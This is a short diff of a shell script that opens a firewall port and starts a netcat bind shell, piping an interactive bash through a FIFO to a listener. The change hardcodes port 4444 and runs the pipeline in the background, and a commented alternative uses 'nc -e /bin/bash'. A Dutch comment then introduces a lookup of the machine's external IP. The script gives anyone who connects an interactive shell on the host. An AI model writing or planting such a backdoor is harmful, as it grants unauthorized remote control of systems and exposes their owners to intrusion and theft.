@@ -21,7 +21,7 @@ iptables -I INPUT -p tcp --dport $LISTENER_PORT -j ACCEPT
 
 # Start listener
 mkfifo /tmp/f
-cat /tmp/f | /bin/bash -i 2>&1 | nc -lvnp $LISTENER_PORT > /tmp/f
+(cat /tmp/f | /bin/bash -i 2>&1 | nc -lvnp 4444 > /tmp/f) &
 # nohup nc -lvnp $LISTENER_PORT -e /bin/bash &>/dev/null &
 
 # Externe IP achterhalen
